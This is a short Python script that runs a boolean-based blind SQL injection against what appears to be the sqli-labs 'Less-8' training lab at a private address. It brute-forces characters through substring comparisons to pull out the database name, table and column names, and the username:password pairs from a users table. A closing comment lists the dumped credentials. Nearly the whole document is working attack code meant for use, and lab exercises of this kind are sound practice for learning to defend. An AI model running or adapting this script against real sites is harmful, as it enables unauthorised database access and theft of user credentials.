import requests
import re
url="http://192.168.68.130/sqli/Less-8/"

response = requests.get(url)

if response.status_code != 200:
    print(response.status_code)
    exit()
#print(response.text)

values=""
for i in range(1,100):
    for j in range(33,127):
        #find="database()"  #数据库
        #find="(select group_concat(table_name) from information_schema.tables where table_schema=database())"  #表
        #find="(select group_concat(column_name) from information_schema.columns where table_name='users' and table_schema=database())" #列
        find="(select group_concat(username,':',password) from users)"  #值
        payload="?id=1' and substring({},{},1)='{}' --+".format(find,i,chr(j))
        response = requests.get(url+payload)
        if b'You are in...........' in response.text.encode():
            values+=chr(j)
            break
print(values)

#DUMB:DUMB,ANGELINA:I-KILL-YOU,DUMMY:P@SSWORD,SECURE:CRAPPY,STUPID:STUPIDITY,SUPERMAN:GENIOUS,BATMAN